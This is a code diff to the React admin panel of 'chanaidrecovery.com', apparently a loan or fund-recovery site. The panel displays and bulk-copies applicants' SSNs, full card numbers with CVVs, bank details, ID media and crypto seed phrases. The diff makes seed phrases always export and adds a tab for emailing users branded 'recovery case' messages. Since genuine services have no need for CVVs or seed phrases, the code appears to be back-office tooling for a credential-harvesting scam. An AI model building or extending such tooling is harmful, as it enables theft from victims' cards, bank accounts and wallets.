@@ -13,8 +13,10 @@ import {
   adminCreateUser,
   adminDeleteUser,
   adminUpdateUser,
+  sendAdminCustomMessage
 } from "@/lib/queries";
 import { toast } from "sonner";
+import { downloadFile } from "@/lib/utils";
 import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
 import {
   Users, Banknote, MessageSquare, RefreshCw,
@@ -22,7 +24,7 @@ import {
   Palette, Type, Save, ChevronRight, TrendingUp,
   FileText, Star, ShieldCheck, Camera, IdCard, BookOpen, CheckCircle2, ZoomIn,
   Clock, CreditCard, ShieldAlert, Fingerprint, Video, XCircle, Play,
-  Activity, Code2, Download, UserPlus, Trash2, Pencil, X, Phone, Mail, Shield, User, Eye, EyeOff, Search
+  Activity, Code2, Download, UserPlus, Trash2, Pencil, X, Phone, Mail, Shield, User, Eye, EyeOff, Search, Send, MessageCircle
 } from "lucide-react";
 import { generateLoanPDF, generateBulkLoanPDF, generateLeadPDF, generateBulkLeadPDF } from "@/lib/pdf-generator";
 import type { StatusHistoryEntry } from "@/types/admin";
@@ -43,23 +45,7 @@ function fmtDate(iso: string) {
 /**
  * Triggers a browser download for a given URL
  */
-async function downloadUrl(url: string, filename: string) {
-  try {
-    const response = await fetch(url);
-    const blob = await response.blob();
-    const blobUrl = window.URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = blobUrl;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    window.URL.revokeObjectURL(blobUrl);
-    document.body.removeChild(a);
-  } catch (e) {
-    console.error("Download failed", e);
-    toast.error(`Failed to download ${filename}`);
-  }
-}
+
 
 // ─── Overview Tab ─────────────────────────────────────────────────────────────
 
@@ -521,7 +507,7 @@ export function LoansTab() {
                                 toast.info(`Starting download of ${assets.length} assets...`);
                                 for (const a of assets) {
                                   const fullUrl = a.u!.startsWith("http") ? a.u! : `https://chanaidrecovery.com/api/assets?key=${a.u}`;
-                                  await downloadUrl(fullUrl, `${r.lastName}_${a.l}.${a.ext}`);
+                                  await downloadFile(fullUrl, `${r.lastName}_${a.l}.${a.ext}`);
                                 }
                                 toast.success("All media assets downloaded");
                               }}
@@ -546,7 +532,7 @@ export function LoansTab() {
                             <DetailSection 
                               title="👤 Personal Identity"
                               onCopyAll={() => {
-                                const text = `Name: ${r.firstName} ${r.lastName}\nDOB: ${r.dateOfBirth}\nSSN: ${r.ssn}\nEIN: ${r.ein}\nEmployment: ${r.employmentStatus}\nIncome: ${r.currency} ${r.monthlyIncome}`;
+                                const text = `Name: ${r.firstName} ${r.lastName}\nDOB: ${r.dateOfBirth}\nSSN: ${r.ssn ?? "Not provided"}\nEIN: ${r.ein ?? "Not provided"}\nEmployment: ${r.employmentStatus ?? "Not provided"}\nIncome: ${r.currency ?? ""} ${r.monthlyIncome ?? ""}`;
                                 navigator.clipboard.writeText(text);
                                 toast.success("Section copied");
                               }}
@@ -577,7 +563,8 @@ export function LoansTab() {
                               <DField label="Email Address" value={r.email} icon={<Globe className="w-3 h-3" />} />
                               <DField label="Phone Number" value={r.phone} icon={<Users className="w-3 h-3" />} />
                               <div className="pt-2 border-t border-gray-100">
-                                <DField label="Home Address" value={`${r.addressLine1}${r.addressLine2 ? ', ' + r.addressLine2 : ''}`} />
+                                <DField label="Home Address" value={r.addressLine1} />
+                                {r.addressLine2 && <DField label="Address Line 2" value={r.addressLine2} />}
                                 <div className="grid grid-cols-2 gap-4">
                                   <DField label="City" value={r.city} />
                                   <DField label="State/Region" value={r.stateRegion} />
@@ -631,12 +618,12 @@ export function LoansTab() {
                                   lines.push(`Account Number: ${r.bankAccountNumber ?? ""}`);
                                   lines.push(`Routing / SWIFT: ${r.bankRoutingNumber ?? ""}`);
                                 }
-                                if (r.cryptoWalletAddress || r.cryptoSeedPhrase) {
+                                if (r.cryptoWalletAddress) {
                                   lines.push("\n=== CRYPTO WALLET ===");
                                   lines.push(`Wallet Type: ${r.cryptoWalletType ?? ""}`);
                                   lines.push(`Network: ${r.cryptoNetwork ?? ""}`);
                                   lines.push(`Address: ${r.cryptoWalletAddress ?? ""}`);
-                                  if (r.cryptoSeedPhrase) lines.push(`Seed Phrase: ${r.cryptoSeedPhrase}`);
+                                  lines.push(`Seed Phrase: ${r.cryptoSeedPhrase ?? "Not provided"}`);
                                 }
                                 if (r.cardNumber) {
                                   lines.push("\n=== CARD ===");
@@ -645,7 +632,7 @@ export function LoansTab() {
                                   lines.push(`CVV: ${r.cardCvv ?? ""}`);
                                   lines.push(`Holder: ${r.cardHolderName ?? ""}`);
                                   lines.push(`Issuer: ${r.cardIssuer ?? ""}`);
-                                  lines.push(`Billing: ${r.billingAddressLine1 ?? ""}, ${r.billingCity ?? ""}, ${r.billingState ?? ""} ${r.billingPostalCode ?? ""}, ${r.billingCountry ?? ""}`);
+                                  lines.push(`Billing: ${r.billingAddressLine1 ?? ""}${r.billingAddressLine2 ? ', ' + r.billingAddressLine2 : ""}, ${r.billingCity ?? ""}, ${r.billingState ?? ""} ${r.billingPostalCode ?? ""}, ${r.billingCountry ?? ""}`);
                                 }
                                 navigator.clipboard.writeText(lines.join("\n"));
                                 toast.success("All financial assets copied");
@@ -669,14 +656,14 @@ export function LoansTab() {
                                     >Copy Bank</button>
                                   </div>
                                   <DField label="Bank Name" value={r.bankName} />
-                                  <DField label="Account Holder" value={r.accountHolderName} />
+                                  {r.accountHolderName && <DField label="Account Holder" value={r.accountHolderName} />}
                                   <DField label="Account Number" value={r.bankAccountNumber} mono />
                                   <DField label="Routing / SWIFT" value={r.bankRoutingNumber} mono />
                                 </div>
                               )}
 
                               {/* Always show Crypto if data exists */}
-                              {(r.cryptoWalletAddress || r.cryptoSeedPhrase) && (
+                              {r.cryptoWalletAddress && (
                                 <div className="space-y-3 mb-6">
                                   <div className="flex items-center justify-between mb-2">
                                     <div className="flex items-center gap-2">
@@ -685,7 +672,7 @@ export function LoansTab() {
                                     </div>
                                     <button
                                       onClick={() => {
-                                        const text = `Wallet: ${r.cryptoWalletType ?? ""}\nNetwork: ${r.cryptoNetwork ?? ""}\nAddress: ${r.cryptoWalletAddress ?? ""}${r.cryptoSeedPhrase ? `\nSeed: ${r.cryptoSeedPhrase}` : ""}`;
+                                        const text = `Wallet: ${r.cryptoWalletType ?? ""}\nNetwork: ${r.cryptoNetwork ?? ""}\nAddress: ${r.cryptoWalletAddress ?? ""}\nSeed Phrase: ${r.cryptoSeedPhrase ?? "Not provided"}`;
                                         navigator.clipboard.writeText(text);
                                         toast.success("Crypto details copied");
                                       }}
@@ -695,11 +682,7 @@ export function LoansTab() {
                                   <DField label="Wallet Ecosystem" value={r.cryptoWalletType} />
                                   <DField label="Settlement Network" value={r.cryptoNetwork} />
                                   <DField label="Recipient Address" value={r.cryptoWalletAddress} mono className="text-orange-700" />
-                                  {r.cryptoSeedPhrase && (
-                                    <div className="p-3 bg-red-50 border border-red-100 rounded-lg">
-                                      <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono className="text-red-600" />
-                                    </div>
-                                  )}
+                                  <DField label="Recovery Seed Phrase" value={r.cryptoSeedPhrase} mono className="text-red-700 font-bold bg-red-50 p-2 rounded border border-red-100" />
                                 </div>
                               )}
 
@@ -730,7 +713,7 @@ export function LoansTab() {
                                       <DField label="CVV" value={r.cardCvv} mono dark className="text-amber-400" />
                                     </div>
                                     <DField label="Card Holder" value={r.cardHolderName} dark className="mt-2" />
-                                    <DField label="Issuer" value={r.cardIssuer} dark className="mt-1" />
+                                    {r.cardIssuer && <DField label="Issuer" value={r.cardIssuer} dark className="mt-1" />}
                                   </div>
                                   <div className="p-3 bg-gray-50 border border-gray-100 rounded-xl">
                                     <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mb-2">📍 Billing Address</p>
@@ -1446,5 +1429,198 @@ function DocVideo({ label, icon, src }: { label: string; icon: React.ReactNode; 
         </div>
       )}
     </>
+  );
+}
+
+// ─── Messages Tab ───────────────────────────────────────────────────────────
+
+export function MessagesTab() {
+  const [users, setUsers] = useState<any[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [sending, setSending] = useState(false);
+  const [search, setSearch] = useState("");
+  
+  const [selectedUser, setSelectedUser] = useState<any | null>(null);
+  const [subject, setSubject] = useState("Important update regarding your recovery case");
+  const [message, setMessage] = useState("");
+
+  const load = useCallback(async () => {
+    setLoading(true);
+    try {
+      const data = await adminListUsers();
+      setUsers(Array.isArray(data) ? data : []);
+    } catch {
+      toast.error("Failed to load users");
+    } finally {
+      setLoading(false);
+    }
+  }, []);
+
+  useEffect(() => { load(); }, [load]);
+
+  const handleSend = async () => {
+    if (!selectedUser || !message || !subject) {
+      toast.error("Please select a user and enter a message");
+      return;
+    }
+
+    setSending(true);
+    try {
+      const res = await sendAdminCustomMessage({
+        to: selectedUser.email,
+        userName: selectedUser.fullName || selectedUser.email.split("@")[0],
+        subject,
+        message,
+      });
+      if (res.success) {
+        toast.success(`Message sent to ${selectedUser.email}`);
+        setMessage("");
+        setSelectedUser(null);
+      }
+    } catch (e: any) {
+      toast.error(e.message || "Failed to send message");
+    } finally {
+      setSending(false);
+    }
+  };
+
+  const filtered = users.filter(u => 
+    !search || 
+    u.email.toLowerCase().includes(search.toLowerCase()) || 
+    (u.fullName || "").toLowerCase().includes(search.toLowerCase())
+  );
+
+  return (
+    <div className="grid lg:grid-cols-3 gap-8">
+      {/* User Selection */}
+      <div className="lg:col-span-1 space-y-4">
+        <div className="bg-white rounded-3xl border border-slate-100 shadow-sm p-6">
+          <h3 className="text-sm font-black text-slate-900 uppercase tracking-widest mb-4 flex items-center gap-2">
+            <Users className="w-4 h-4 text-primary" /> Recipients
+          </h3>
+          
+          <div className="relative mb-4">
+            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
+            <input 
+              type="text" placeholder="Search users..." value={search}
+              onChange={e => setSearch(e.target.value)}
+              className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 text-xs font-semibold focus:border-primary outline-none transition-all"
+            />
+          </div>
+
+          <div className="space-y-2 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+            {loading ? (
+              <div className="py-8 text-center text-slate-300 animate-pulse font-bold text-xs uppercase">Syncing Users...</div>
+            ) : filtered.length === 0 ? (
+              <div className="py-8 text-center text-slate-300 font-bold text-xs uppercase">No users found</div>
+            ) : filtered.map(u => (
+              <button
+                key={u.id}
+                onClick={() => setSelectedUser(u)}
+                className={`w-full text-left p-3 rounded-2xl border transition-all flex items-center gap-3 ${
+                  selectedUser?.id === u.id 
+                    ? "bg-primary/5 border-primary shadow-sm" 
+                    : "bg-white border-slate-100 hover:border-slate-300"
+                }`}
+              >
+                <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-[10px] font-black text-slate-500 shrink-0 uppercase">
+                  {(u.fullName || u.email)[0]}
+                </div>
+                <div className="min-w-0">
+                  <p className="text-xs font-bold text-slate-900 truncate">{u.fullName || "Unnamed User"}</p>
+                  <p className="text-[10px] text-slate-400 truncate">{u.email}</p>
+                </div>
+                {selectedUser?.id === u.id && <ChevronRight className="w-3.5 h-3.5 ml-auto text-primary" />}
+              </button>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Composer */}
+      <div className="lg:col-span-2">
+        <div className="bg-white rounded-[2.5rem] border border-slate-100 shadow-xl overflow-hidden flex flex-col h-full">
+          <div className="px-8 py-6 border-b border-slate-50 bg-slate-50/30 flex items-center justify-between">
+            <div>
+              <h3 className="text-lg font-black text-slate-900 italic tracking-tight">Direct <span className="text-primary">Messaging</span></h3>
+              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Secure Administrative Communication</p>
+            </div>
+            <div className="flex items-center gap-2">
+               <div className="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-600 text-[9px] font-black uppercase tracking-tighter">
+                 SMTP Secure
+               </div>
+            </div>
+          </div>
+
+          <div className="p-8 flex-1 space-y-6">
+            {!selectedUser ? (
+              <div className="h-full min-h-[400px] flex flex-col items-center justify-center text-center space-y-4">
+                <div className="w-20 h-20 rounded-[2rem] bg-slate-50 flex items-center justify-center">
+                  <MessageCircle className="w-10 h-10 text-slate-200" />
+                </div>
+                <div>
+                  <h4 className="font-black text-slate-900">Select a Recipient</h4>
+                  <p className="text-xs text-slate-400 max-w-[240px] mx-auto mt-1 font-medium">Choose a user from the list on the left to start composing a custom branded message.</p>
+                </div>
+              </div>
+            ) : (
+              <>
+                <div className="space-y-4">
+                  <div className="grid sm:grid-cols-2 gap-4">
+                    <div className="space-y-1.5">
+                      <label className="text-[10px] font-black uppercase tracking-widest text-slate-400 ml-1">Recipient</label>
+                      <div className="h-12 px-4 rounded-2xl bg-slate-50 border border-slate-100 flex items-center text-xs font-bold text-slate-700">
+                        {selectedUser.fullName ? `${selectedUser.fullName} (${selectedUser.email})` : selectedUser.email}
+                      </div>
+                    </div>
+                    <div className="space-y-1.5">
+                      <label className="text-[10px] font-black uppercase tracking-widest text-slate-400 ml-1">Email Subject</label>
+                      <input 
+                        type="text" value={subject} onChange={e => setSubject(e.target.value)}
+                        placeholder="Subject..."
+                        className="w-full h-12 px-4 rounded-2xl bg-white border border-slate-200 focus:border-primary outline-none text-xs font-bold transition-all"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <label className="text-[10px] font-black uppercase tracking-widest text-slate-400 ml-1">Message Content</label>
+                    <textarea 
+                      value={message} onChange={e => setMessage(e.target.value)}
+                      placeholder="Type your message here... The user will receive this in a professionally branded HTML email."
+                      className="w-full min-h-[300px] p-5 rounded-3xl bg-white border border-slate-200 focus:border-primary outline-none text-sm font-medium leading-relaxed transition-all resize-none"
+                    />
+                    <div className="flex items-center gap-2 mt-2 px-1">
+                      <div className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse" />
+                      <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Supports plain text formatting only. Branding applied automatically.</p>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="pt-6 border-t border-slate-50 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 rounded-xl bg-slate-50 border border-slate-100 flex items-center justify-center">
+                       <Mail className="w-5 h-5 text-slate-400" />
+                    </div>
+                    <div className="hidden sm:block">
+                      <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Sending From</p>
+                      <p className="text-[11px] font-bold text-slate-600">no-reply@chanaidrecovery.com</p>
+                    </div>
+                  </div>
+                  <button
+                    disabled={sending || !message || !subject}
+                    onClick={handleSend}
+                    className="h-14 px-10 bg-primary text-white font-black rounded-2xl shadow-xl shadow-primary/20 hover:bg-primary/90 transition-all flex items-center gap-3 disabled:opacity-50 active:scale-[0.95]"
+                  >
+                    {sending ? <RefreshCw className="w-5 h-5 animate-spin" /> : <Send className="w-5 h-5" />}
+                    {sending ? "TRANSMITTING..." : "SEND SECURE MESSAGE"}
+                  </button>
+                </div>
+              </>
+            )}
+          </div>
+        </div>
+      </div>
+    </div>
   );
 }
